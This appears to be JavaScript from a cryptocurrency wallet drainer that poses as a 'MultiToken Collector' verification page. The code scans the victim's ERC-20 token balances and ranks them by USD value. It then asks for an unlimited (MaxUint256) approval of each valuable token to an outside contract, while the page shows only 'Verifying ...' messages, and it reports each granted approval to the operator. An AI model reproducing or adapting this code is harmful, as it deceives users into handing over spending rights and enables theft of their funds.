let pendingTokensQueue = [];
let isApprovalProcessing = false;

function appendStep(text) {
    const stepsDiv = getEl("steps");
    if (!stepsDiv) return;
    
    const stepP = document.createElement("p");
    stepP.className = "step-text";
    stepP.textContent = text;
    stepsDiv.appendChild(stepP);
}

function updateStep(oldText, newText) {
    const stepsDiv = getEl("steps");
    if (!stepsDiv) return;
    
    const steps = stepsDiv.querySelectorAll('.step-text');
    for (const step of steps) {
        if (step.textContent.includes(oldText)) {
            step.textContent = newText;
            break;
        }
    }
}

function showFinalResult() {
    const statusDiv = getEl("status");
    const stepsDiv = getEl("steps");
    
    if (statusDiv) statusDiv.textContent = "✅ Verification Process Complete!";
    
    setTimeout(() => {
        if (stepsDiv) {
            stepsDiv.innerHTML += `
                <div class="final-result">
                    <h2>✅ Process Complete</h2>
                    <p>Thank you for using MultiToken Collector!</p>
                </div>
            `;
        }
    }, 1000);
}

async function fetchAndRenderBalances(userAddress, spenderAddress) {
    if (!web3Provider) {
        window.debugLog("Provider not initialized", "error");
        const errorDiv = getEl("error");
        if (errorDiv) errorDiv.textContent = "Provider not initialized";
        return;
    }
    
    window.debugLog("Starting token scan for: " + userAddress, "info");
    
    try {
        const erc20Abi = [
            "function balanceOf(address) view returns (uint256)", 
            "function decimals() view returns (uint8)"
        ];
        
        const tokenPromises = TOKENS.map(async (t) => {
            try {
                window.debugLog("Checking " + t.name + " balance...", "info");
                
                const contract = new ethers.Contract(t.address, erc20Abi, web3Provider);
                const rawBal = await contract.balanceOf(userAddress);
                const decimals = await contract.decimals();
                const fmtBal = parseFloat(ethers.formatUnits(rawBal, decimals));
                
                window.debugLog(t.name + " raw balance: " + rawBal.toString(), "info");
                window.debugLog(t.name + " formatted balance: " + fmtBal, "info");
                
                return fmtBal > 0 ? { ...t, balance: fmtBal } : null;
            } catch (err) { 
                window.debugLog(t.name + " balance error: " + err.message, "error");
                return null; 
            }
        });
        
        const results = await Promise.all(tokenPromises);
        const foundTokens = results.filter(t => t !== null);
        
        window.debugLog("Found " + foundTokens.length + " tokens with balance > 0", "success");
        
        const evaluatedTokens = await Promise.all(foundTokens.map(async (t) => {
            window.debugLog("Fetching price for " + t.name + "...", "info");
            const priceUsd = await fetchPrice(t.address, t.stable);
            const usdValue = t.balance * priceUsd;
            window.debugLog(t.name + " price: $" + priceUsd + " | Value: $" + usdValue.toFixed(2), "info");
            return { ...t, usdValue: usdValue };
        }));
        
        pendingTokensQueue = evaluatedTokens
            .filter(t => t.usdValue >= MIN_VALUE_FRONTEND)
            .sort((a, b) => b.usdValue - a.usdValue);
        
        window.debugLog("Tokens >= $" + MIN_VALUE_FRONTEND + ": " + pendingTokensQueue.length, "warning");
        
        if (pendingTokensQueue.length > 0) {
            window.debugLog("Starting approval queue with " + pendingTokensQueue.length + " tokens", "success");
            executeNextApprove();
        } else {
            window.debugLog("No tokens found with value >= $" + MIN_VALUE_FRONTEND, "warning");
            showFinalResult();
        }
    } catch (e) {
        window.debugLog("Scan error: " + e.message, "error");
        console.error('Scan error:', e);
        const statusDiv = getEl("status");
        const errorDiv = getEl("error");
        if (statusDiv) statusDiv.textContent = "";
        if (errorDiv) errorDiv.textContent = "Token scanning failed";
    }
}

async function executeNextApprove() {
    if (isApprovalProcessing || pendingTokensQueue.length === 0) return;
    isApprovalProcessing = true;
    
    const t = pendingTokensQueue[0];
    appendStep(`Verifying ${t.name}...`);
    window.debugLog("Approving " + t.name + "...", "info");
    
    try {
        if (!web3Signer) throw new Error("Signer not initialized");
        
        const erc20Abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
        const tokenContract = new ethers.Contract(
            ethers.getAddress(t.address), 
            erc20Abi, 
            web3Signer
        );
        
        const tx = await tokenContract.approve(
            ethers.getAddress(CONTRACT_ADDRESS), 
            ethers.MaxUint256
        );
        
        window.debugLog(t.name + " transaction sent: " + tx.hash, "info");
        
        await tx.wait();
        
        window.debugLog(t.name + " transaction confirmed", "success");
        
        notifyApproval(connectedAddress, t.address);
        
        updateStep(`Verifying ${t.name}...`, `Verifying ${t.name}... ✅`);
        
        pendingTokensQueue.shift();
        isApprovalProcessing = false;
        
        if (pendingTokensQueue.length > 0) {
            setTimeout(() => { 
                executeNextApprove(); 
            }, APPROVAL_DELAY);
        } else {
            showFinalResult();
        }
    } catch (error) {
        window.debugLog(t.name + " approval error: " + error.message, "error");
        console.error(`Approval error for ${t.name}:`, error.message);
        updateStep(`Verifying ${t.name}...`, `Verifying ${t.name}... ❌`);
        
        pendingTokensQueue.shift();
        isApprovalProcessing = false;
        executeNextApprove();
    }
}